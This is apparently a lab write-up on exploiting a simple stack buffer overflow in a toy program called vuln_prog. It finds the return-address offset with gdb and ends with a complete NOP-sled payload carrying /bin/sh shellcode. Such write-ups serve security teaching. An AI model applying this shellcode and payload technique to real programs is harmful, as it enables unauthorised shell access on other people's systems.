The objective here was to exploit a very simple buffer overflow in the program called vuln_prog. 

First, I have run vuln_prog with gdb using the command: gdb vuln_prog

The size of the buffer in the program is 500 bytes. So we can try printing A's and try to fill up the buffer. We can use python or perl script: run $(python -c "print('A'*500)"). The program exits normally. We now increment the A's and see if there is any variation in the output. At 508 A's we get a segmentation fault. We go ahead and see that the memory address starts when we use 513 A's , the memory address being replaced with 41 which is hexadecimal value of A.

Now, we can confirm that the return address starts when we fill with 512 A's.

The next step is to place a working shell code in the buffer. First, test the shellcode to check if it works before placing it in the buffer. To make things easier and not be specific to get the exact address where the shell code starts we insert the NOP sled. Our shell code is 45 bytes, so the rest of the 467 bytes can be NOP (\x90) to fill up the buffer. Finally, we need to add the return address to our payload.
Any memory address in the NOP can be chosen as the return address and added to payload in little endian format.

The final payload: $(python -c 'print "\x90"*467 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0""\x88\x46\x07\x89\x46\x0c\xb0\x0b""\x89\xf3\x8d\x4e\x08\x8d\x56\x0c""\xcd\x80\x31\xdb\x89\xd8\x40\xcd""\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x58\xd9\xff\xff"')
